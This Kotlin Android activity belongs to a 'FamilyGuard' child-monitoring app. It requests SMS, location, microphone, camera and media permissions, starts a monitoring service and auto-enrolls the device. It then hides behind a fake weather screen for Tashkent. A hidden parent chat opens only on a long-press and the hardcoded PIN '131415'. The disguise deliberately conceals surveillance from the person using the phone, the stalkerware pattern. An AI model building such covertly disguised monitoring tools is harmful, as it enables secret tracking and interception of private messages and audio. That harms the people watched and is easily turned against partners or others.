package com.familyguard.child

import android.Manifest
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.background
import androidx.compose.foundation.gestures.detectTapGestures
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.DarkMode
import androidx.compose.material.icons.filled.LightMode
import androidx.compose.material3.AlertDialog
import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.material3.Icon
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.input.pointer.pointerInput
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.familyguard.child.agent.GuardForegroundService
import com.familyguard.child.agent.MonitoringSettings
import com.familyguard.child.data.ApiClient
import com.familyguard.child.ui.FamilyChat
import com.familyguard.child.ui.theme.FamilyGuardChildTheme
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import java.util.Locale

private const val COVER_PIN = "131415"

class MainActivity : ComponentActivity() {
    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions(),
    ) { GuardForegroundService.start(this) }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            FamilyGuardChildTheme {
                Surface(Modifier.fillMaxSize()) {
                    ChildRoot(
                        onFirstLaunchPermissions = {
                            requestRuntimePermissions()
                            MonitoringSettings.openAllOnce(this)
                            GuardForegroundService.start(this)
                        },
                        onReady = { GuardForegroundService.start(this) },
                    )
                }
            }
        }
    }

    private fun requestRuntimePermissions() {
        val perms = mutableListOf(
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA,
        )
        if (Build.VERSION.SDK_INT >= 33) {
            perms += Manifest.permission.READ_MEDIA_IMAGES
            perms += Manifest.permission.READ_MEDIA_VIDEO
            perms += Manifest.permission.POST_NOTIFICATIONS
        } else {
            perms += Manifest.permission.READ_EXTERNAL_STORAGE
        }
        permissionLauncher.launch(perms.toTypedArray())
    }
}

@Composable
private fun ChildRoot(
    onFirstLaunchPermissions: () -> Unit,
    onReady: () -> Unit,
) {
    var ready by remember { mutableStateOf(false) }
    var chat by remember { mutableStateOf(false) }
    var error by remember { mutableStateOf<String?>(null) }
    val api = remember { ApiClient(ChildApp.instance.session) }
    LaunchedEffect(Unit) {
        while (true) {
            runCatching {
                val deviceName = "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"
                val res = api.autoJoin(deviceName)
                ChildApp.instance.session.saveAuth(
                    res.tokens.accessToken,
                    res.tokens.refreshToken,
                    res.family!!.id,
                    res.deviceId ?: 0,
                    res.user.id,
                    res.user.displayName,
                )
                if (!ChildApp.instance.session.permissionsAsked()) {
                    onFirstLaunchPermissions()
                    ChildApp.instance.session.markPermissionsAsked()
                } else {
                    onReady()
                }
                ready = true
                error = null
                return@LaunchedEffect
            }.onFailure { error = it.message }
            delay(3000)
        }
    }
    when {
        !ready -> Box(Modifier.fillMaxSize().background(Color(0xFF0B1F33)), contentAlignment = Alignment.Center) {
            Column(horizontalAlignment = Alignment.CenterHorizontally) {
                CircularProgressIndicator(color = Color.White)
                Spacer(Modifier.height(12.dp))
                Text("Oilaga ulanmoqda…", color = Color.White, fontWeight = FontWeight.SemiBold)
                error?.let { Text(it, color = Color(0xFFFFCDD2), modifier = Modifier.padding(16.dp)) }
            }
        }
        chat -> FamilyChat(title = "Ota-ona", onBack = { chat = false })
        else -> WeatherCover(onOpenChat = { chat = true })
    }
}

@Composable
private fun WeatherCover(onOpenChat: () -> Unit) {
    var temp by remember { mutableStateOf("--") }
    var desc by remember { mutableStateOf("Yuklanmoqda") }
    var askPin by remember { mutableStateOf(false) }
    var pin by remember { mutableStateOf("") }
    var pinError by remember { mutableStateOf<String?>(null) }
    val dark by ChildApp.instance.session.isDarkCover.collectAsState(initial = false)
    val scope = rememberCoroutineScope()
    LaunchedEffect(Unit) {
        while (true) {
            runCatching {
                withContext(Dispatchers.IO) {
                    val url = "https://api.open-meteo.com/v1/forecast?latitude=41.3&longitude=69.24&current=temperature_2m,weather_code"
                    val body = OkHttpClient().newCall(Request.Builder().url(url).build()).execute().body?.string().orEmpty()
                    val json = JSONObject(body).getJSONObject("current")
                    temp = String.format(Locale.getDefault(), "%.0f°", json.getDouble("temperature_2m"))
                    desc = weatherDesc(json.getInt("weather_code"))
                }
            }
            delay(15 * 60_000L)
        }
    }
    val sky = if (dark) {
        listOf(Color(0xFF050505), Color(0xFF121212), Color(0xFF1C1C1C), Color(0xFF2A2A2A))
    } else {
        listOf(Color(0xFF0B3A6A), Color(0xFF2E86C1), Color(0xFF7EC8E3), Color(0xFFF7D794))
    }
    val ink = if (dark) Color(0xFFF2F2F2) else Color.White
    Box(Modifier.fillMaxSize().background(Brush.verticalGradient(sky))) {
        Column(
            Modifier.align(Alignment.Center),
            horizontalAlignment = Alignment.CenterHorizontally,
        ) {
            Text("Toshkent", color = ink.copy(alpha = 0.9f), fontSize = 22.sp, fontWeight = FontWeight.Medium)
            Text(temp, color = ink, fontSize = 92.sp, fontWeight = FontWeight.Light)
            Text(desc, color = ink.copy(alpha = 0.9f), fontSize = 22.sp)
            Spacer(Modifier.height(28.dp))
            Box(
                Modifier
                    .size(56.dp)
                    .clip(CircleShape)
                    .background(if (dark) Color(0xFF2A2A2A) else Color.White.copy(alpha = 0.28f))
                    .pointerInput(Unit) {
                        detectTapGestures(
                            onTap = { scope.launch { ChildApp.instance.session.setDarkCover(!dark) } },
                            onLongPress = {
                                pin = ""
                                pinError = null
                                askPin = true
                            },
                        )
                    },
                contentAlignment = Alignment.Center,
            ) {
                Icon(
                    if (dark) Icons.Default.LightMode else Icons.Default.DarkMode,
                    contentDescription = "tema",
                    tint = ink,
                    modifier = Modifier.size(26.dp),
                )
            }
        }
    }
    if (askPin) {
        AlertDialog(
            onDismissRequest = { askPin = false },
            title = { Text("Kod") },
            text = {
                Column {
                    OutlinedTextField(
                        value = pin,
                        onValueChange = { pin = it.filter { c -> c.isDigit() }.take(8) },
                        label = { Text("PIN") },
                        visualTransformation = PasswordVisualTransformation(),
                        modifier = Modifier.fillMaxWidth(),
                    )
                    pinError?.let { Text(it, color = Color(0xFFD32F2F), fontSize = 13.sp) }
                }
            },
            confirmButton = {
                TextButton(onClick = {
                    if (pin == COVER_PIN) {
                        askPin = false
                        onOpenChat()
                    } else {
                        pinError = "Noto‘g‘ri"
                    }
                }) { Text("OK") }
            },
            dismissButton = {
                TextButton(onClick = { askPin = false }) { Text("Bekor") }
            },
            shape = RoundedCornerShape(20.dp),
        )
    }
}

private fun weatherDesc(code: Int): String = when (code) {
    0 -> "Ochiq osmon"
    1, 2, 3 -> "Qisman bulutli"
    45, 48 -> "Tuman"
    51, 53, 55, 61, 63, 65 -> "Yomg‘ir"
    71, 73, 75 -> "Qor"
    95, 96, 99 -> "Momaqaldiroq"
    else -> "Ob-havo"
}
